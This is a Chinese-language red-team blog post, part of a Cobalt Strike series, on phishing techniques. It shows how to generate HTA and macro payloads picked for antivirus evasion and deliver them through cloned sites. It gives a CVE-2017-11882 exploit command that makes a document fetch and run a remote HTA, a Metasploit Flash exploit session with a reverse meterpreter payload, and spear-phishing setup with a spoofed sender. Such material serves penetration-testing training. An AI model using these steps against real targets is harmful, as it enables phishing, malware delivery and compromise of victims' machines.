---
layout:     post
title:    Cobalt Strike系列 4
subtitle:   Cobalt Strike 钓鱼
date:       2019-08-13
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - Cobalt Strike
    - 红队
---

# Cobalt Strike系列 4 钓鱼有关




# 简介

- Hta文件钓鱼
- Office钓鱼
- 联动其他平台钓鱼
- 邮件 鱼叉攻击

## Hta文件钓鱼
Hta是Html Application的缩写，直接将Html保存为Hta格式，当成一个独立的应用。  
生成方式 Attack>Packages>HTML Application  
![hta](/img/hta.png)  
CS提供了3种生成方式 exe,powershell,vba。其中vba方法需要目标系统上有Microsoft Office，在系统支持的情况下我们一般选择powershell，因为这种方式更加容易免杀。  
![hta2](/img/hta2.png)  
选择powershell生成。  
![hta3](/img/hta3.png)  
利用的话，我们这里选择使用host file联动。开启前注意端口开放。  
![hostfile](/img/hostfile.png)  
![hostfile1](/img/hostfile1.png)  
然后就是诱导受害者打开链接，并且运行了，这里就不做演示了。成功点击后会生成一个beacon。  
实际中这种方式更多是配合网站克隆使用的。  
### 网站克隆
Attack>Web Drive-by>Clone Site
![clonesite](/img/clonesite.png)  
![clonesite1](/img/clonesite1.png)  
给我们提供了便利选项，直接点attack后面的按钮，可以选择之前生成的hta服务。  
![clonesite2](/img/clonesite2.png)  
如何诱导就看自己的了，裸ip别想了，除非是傻子，由于条件有限，没有整域名。



## Office 钓鱼
常见的office钓鱼就是宏，office漏洞以及DDE模块。这里就讲一下文档内嵌恶意宏。这是在APT活动中最常见的手法。  
Attack>Packages>MS Office Macro  
![marco](/img/marco.png)  
然后制作文档，我这里没有office，盗个图吧。  
![marco1](/img/marco1.png)  
![marco2](/img/marco2.png)  
![marco3](/img/marco3.png)  
![marco4](/img/marco4.png)  

还有就是利用Office漏洞的，常见用CVE-2017-11882，配合hta文件。这里我给上exp的项目地址：  
[CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)  
使用的话：  
```shell
python Command_CVE-2017-11882.py -c "mshta http://ip:port/abc.hta" -o test.doc -i input.rtf //自定义内容
```

## 联动其他平台钓鱼
以msf为例，借鉴一些老的资料，这里使用一个adobe_flash_hacking_team_uaf的漏洞。  
在msf上设置好相关模块和参数。  
```
msf > use exploit/multi/browser/adobe_flash_hacking_team_uaf
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set DisablePayloadHandler true
DisablePayloadHandler => true
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set LHOST ip
LHOST => ip
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set LPORT 8880
LPORT => 8880
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > exploit -j
[*] Exploit running as background job 2.

[*] Using URL: http://0.0.0.0:80/X11zRtcWP
[*] Local IP: http://ip/X11zRtcWP
[*] Server started.
```

![msfadobe](/img/msfadobe.png)  
然后再配置Cs 生成一个Listeners 端口和msf 中LPORT的端口一样,地址就是主机地址，然后我们可以直接把msf中的连接发送给目标机了，当然建议配合克隆使用。
因为环境问题，没办法复现，图就自己脑补吧。  
![msfclone](/img/msfclone.png)  
![cant](/img/cant.png)  

## 邮件 鱼叉攻击
先配置Spear Phish。  
Attack>Spear Phish  
![mail](/img/mail.png)  
因为这个自带的不是很实用，就简单说了。  
- tmplate 邮件模板 一般在邮件的更多选项中 ，选择导出，或者显示原文
- attachment 附件
- Embed URL 要嵌入的网址
- Mail server SMTP
- Bounce to 模仿发件人  
其中第一选项targets中的格式:  
```
111@qq.com	a  
222@163.com	b  
```
实际中的话是要配合各种钓鱼连接或者文件，结合上面的手段去使用。  











